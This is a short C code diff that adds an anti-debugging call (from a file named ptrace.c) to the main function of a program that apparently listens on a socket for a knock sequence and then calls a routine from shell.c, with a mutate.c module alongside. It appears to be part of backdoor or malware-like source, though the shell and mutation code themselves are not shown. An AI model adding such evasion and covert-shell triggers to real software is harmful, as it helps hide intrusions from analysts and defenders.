@@ -14,7 +14,8 @@
 #define EXPECTED_SEQUENCE_SIZE 3
 #define BUFSIZE 1024
 
-extern int perform_action();              // shell.c
+extern void anti_debug();		// ptrace.c
+extern int perform_action();            // shell.c
 extern int mutate_main(int argc, char **argv);  // mutate.c
 
 const char *EXPECTED_SEQUENCE[EXPECTED_SEQUENCE_SIZE] = {
@@ -77,6 +78,9 @@ int main(int argc, char **argv) {
     socklen_t len;
     char buffer[BUFSIZE];
     int sequenceIndex = 0;
+
+    // Call ptrace
+    anti_debug();
 
     const char *self_path = resolve_self_path(argv[0]);
 
